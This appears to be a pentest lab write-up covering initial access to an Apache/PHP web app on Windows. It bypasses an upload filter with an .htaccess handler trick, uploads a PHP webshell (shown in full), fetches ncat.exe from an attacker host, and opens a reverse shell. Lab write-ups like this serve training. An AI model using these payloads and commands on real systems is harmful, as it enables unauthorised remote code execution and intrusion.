**HyperText Transport Protocol**

# Findings
- Apache2 (2.4.48)  serving PHP on Windows Server

# Environment Variables / Setup

```
export IP=192.168.179.187
```

# Identify Tech Stack
## whatweb

```
whatweb $URL
```

```
http://192.168.213.187:80 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], Email[info@example.com], Frame, HTML5, HTTPServer[Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7], IP[192.168.213.187], Lightbox, OpenSSL[1.1.1k], PHP[8.0.7], Script, Title[Access The Event]
```

## [Wappalyzer](https://www.wappalyzer.com/apps/)

![[Pasted image 20250725065740.png]]

## Content Discovery

### directory 

```
ffuf -u $URL/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -fc 404
```

```
uploads                 [Status: 301, Size: 344, Words: 22, Lines: 10, Duration: 103ms]
assets                  [Status: 301, Size: 343, Words: 22, Lines: 10, Duration: 91ms]
webalizer               [Status: 403, Size: 423, Words: 37, Lines: 12, Duration: 106ms]
forms                   [Status: 301, Size: 342, Words: 22, Lines: 10, Duration: 92ms]
phpmyadmin              [Status: 403, Size: 423, Words: 37, Lines: 12, Duration: 101ms]
Uploads                 [Status: 301, Size: 344, Words: 22, Lines: 10, Duration: 101ms]
Assets                  [Status: 301, Size: 343, Words: 22, Lines: 10, Duration: 102ms]
Forms                   [Status: 301, Size: 342, Words: 22, Lines: 10, Duration: 107ms]
licenses                [Status: 403, Size: 423, Words: 37, Lines: 12, Duration: 96ms]
server-status           [Status: 403, Size: 423, Words: 37, Lines: 12, Duration: 94ms]
con                     [Status: 403, Size: 304, Words: 22, Lines: 10, Duration: 99ms]
FORMS                   [Status: 301, Size: 342, Words: 22, Lines: 10, Duration: 88ms]
UPLOADS                 [Status: 301, Size: 344, Words: 22, Lines: 10, Duration: 101ms]
aux                     [Status: 403, Size: 304, Words: 22, Lines: 10, Duration: 95ms]
prn                     [Status: 403, Size: 304, Words: 22, Lines: 10, Duration: 130ms]
server-info             [Status: 403, Size: 423, Words: 37, Lines: 12, Duration: 96ms]
ASSETS                  [Status: 301, Size: 343, Words: 22, Lines: 10, Duration: 91ms]
Con                     [Status: 403, Size: 304, Words: 22, Lines: 10, Duration: 98ms]
UpLoads                 [Status: 301, Size: 344, Words: 22, Lines: 10, Duration: 95ms]
:: Progress: [62281/62281] :: Job [1/1] :: 414 req/sec :: Duration: [0:02:35] :: Errors: 0 ::
```

# Manual Inspection (Walk application in Burp Suite)

![[Pasted image 20250725070943.png]]

There is a file upload available when buying tickets.

![[Pasted image 20250725071324.png]]

This corresponds to a POST request to /Ticket.php which we can inspect in our HTTP history.

![[Pasted image 20250725071428.png]]

By visiting the /uploads directory we discovered with ffuf, we're able to see and open our image. If we can instead upload a webshell (PHP in this case), this would allow us remote code execution on the server.

![[Pasted image 20250725071753.png]]

`cp /usr/share/webshells/php/php-backdoor.php ./webshell.php`
Copy a PHP webshell to our current directory to attempt uploading next.

The web application detects our .php extension and doesn't allow us to upload the file. I verified that it was actually blocked by checking /uploads again, just to be sure.

![[Pasted image 20250725072232.png]]

Still, we can try to bypass this file upload restriction by testing exactly what we CAN upload. I'll be referencing [HTB Academy's page on file upload attacks](https://academy.hackthebox.com/module/details/136).

# Testing File Extension Validation (Rabbit Hole)

I'll mark the ".png" as the fuzzing position by enclosing it in marks, and then copy-paste a list of PHP enabled file extensions as my payload (from PayloadsAllTheThings' repo https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)

![[Pasted image 20250726101110.png]]
*Make sure do de-select payload URL-encoding in the bottom right.*

They all succeed with status codes of 200, but by sorting by length, we can see the responses that indicate upload success.

![[Pasted image 20250726100730.png]]

.phpt uploaded successfully and is a valid file type for PHP, unlike the others like php%00.gif which we were able to upload, but was stored on the server as-is, meaning we're unable to execute PHP code with it.

![[Pasted image 20250726100840.png]]

Visiting `/uploads/webshell.phpt` however, it seems to execute!... however I get permission denied when actually trying to run a command.

# Webshell via .HTACCESS -> Initial Access
After more troubleshooting, I discovered an alternative strategy.

https://youtu.be/h1Br5umYxwc?si=nhmXwrhAOH7IXFgh&t=2656
`touch .htaccess`

```
AddType application/x-httpd-php .evil
```

Now we can upload this, and then upload a webshell with the .evil extension and run it!

```
GIF89a;
<?php
echo "<pre>\n";
passthru($_GET['cmd']);
echo "</pre>";
?>
```

![[Pasted image 20250726184117.png]]

`curl http://192.168.179.187/uploads/webshell.evil?cmd=whoami`

```
GIF89a;
<pre>
access\svc_apache
</pre>
```


Transfer ncat.exe to the target.
https://nmap.org/ncat/
https://nmap.org/dist/ncat-portable-5.59BETA1.zip

`python3 -m http.server 443`

`curl 'http://192.168.179.187/uploads/webshell.evil?cmd=curl%20http:
//192.168.45.240:443/ncat.exe%20-O'`

Confirm it was written to the server.
`curl http://192.168.179.187/uploads/webshell.evil?cmd=dir` 

![[Pasted image 20250726191939.png]]

Now we'll use the ncat.exe to establish a reverse shell.

`curl 'http://192.168.179.187/uploads/webshell.evil?cmd=.\ncat.exe%20192.168.45.155%201234%20-e%20cmd.exe'`

![[Pasted image 20250726192508.png]]

# Privilege Escalation
`whoami /priv`

```
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

We don't have any notable permissions.
Continued in [[svc_apache -> svc_mssql]]